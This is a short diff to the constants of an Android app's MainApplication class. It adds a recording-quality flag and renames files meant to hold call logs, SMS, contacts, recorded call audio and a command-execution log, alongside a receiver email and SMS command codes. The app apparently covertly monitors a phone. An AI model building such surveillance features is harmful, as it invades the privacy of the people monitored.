@@ -24,6 +24,8 @@ public class MainApplication extends Application {
 	 * 接收者的email
 	 */
 	private String receiverEmailAddr = "";
+	
+	public static final boolean RECORDER_HIGH_QUALITY = false;
 
 	public static final String PHONE_CODE_UP = "zgy_011";
 	public static final String PHONE_CODE_DOWN = "zgy_012";
@@ -88,13 +90,13 @@ public class MainApplication extends Application {
 	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
 	public static final File FILE_DB_SMS = new File(MainApplication.FILE_IN_SDCARD + SdcardSqliteHelper.DATABASENAME);
 	
-	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
 	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
 	
-	public static final File FILE_CODE_TEXT = new File(FILE_IN_SDCARD + ".codestemp.txt");
-	public static final File FILE_SMS_TEXT = new File(FILE_IN_SDCARD + ".androidsmstemp.txt");
-	public static final File FILE_CONTACTS_TEXT = new File(FILE_IN_SDCARD + ".contactstemp.txt");
+	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + "通话记录.txt");
+	public static final File FILE_CODE_TEXT = new File(FILE_IN_SDCARD + "命令执行记录.txt");
+	public static final File FILE_SMS_TEXT = new File(FILE_IN_SDCARD + "短信记录.txt");
+	public static final File FILE_CONTACTS_TEXT = new File(FILE_IN_SDCARD + "通讯录.txt");
 	
 	private static MainApplication instence;
 
